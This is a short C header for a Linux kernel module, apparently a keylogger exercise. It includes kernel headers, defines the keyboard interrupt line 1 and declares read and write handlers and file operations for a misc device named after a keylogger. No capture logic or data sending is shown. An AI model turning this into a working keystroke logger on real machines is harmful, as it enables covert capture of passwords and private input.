#ifndef KEYBOARD_H
# define KEYBOARD_H
 
# include <linux/module.h>
# include <linux/kernel.h>
# include <linux/init.h>
# include <linux/miscdevice.h>
# include <linux/fs.h>
# include <linux/device.h>
# include <linux/string.h>
# include <linux/list.h>
# include <linux/irq.h>
# include <linux/interrupt.h>

# define KEYBOARD_IRQ		1

ssize_t keylogger_read(struct file *filp, char __user *buffer,
				size_t length, loff_t *offset);

ssize_t keylogger_write(struct file *filp, const char __user *buffer,
				size_t length, loff_t *offset);

struct file_operations keylogger_misc_fops;

#endif
